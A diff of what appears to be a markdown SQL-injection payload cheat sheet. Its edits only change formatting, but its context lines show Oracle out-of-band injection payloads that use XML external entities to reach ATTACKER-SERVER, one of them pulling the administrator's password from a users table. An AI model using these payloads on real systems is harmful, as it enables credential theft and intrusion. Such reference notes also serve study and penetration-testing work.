@@ -199,6 +199,7 @@
 
 ### Exploitation Payloads
 
+<br>
 
 #### SQLi UNION Technique Example
 
@@ -236,7 +237,7 @@
 ```
 
 
-<br>
+<br><br>
 
 #### SQLi Blind Conditional Responses Examples
 
@@ -297,7 +298,7 @@
 ```
 
 
-<br>
+<br><br>
 
 #### SQLi Blind Conditional Errors Examples
 
@@ -358,7 +359,7 @@
 ```
 
 
-<br>
+<br><br>
 
 #### SQLi Blind Time Delays Examples
 
@@ -422,7 +423,7 @@
 
 
 
-<br>
+<br><br>
 
 #### SQLi Out of Band Interaction
 
@@ -441,7 +442,6 @@
 '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//ATTACKER-SERVER/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```
 
-    * Decoded Payload:
 
 
 
@@ -473,7 +473,6 @@ FROM dual--
 '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.ATTACKER-SERVER/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```
 
-    * Decoded Payload:
 
 
 ```
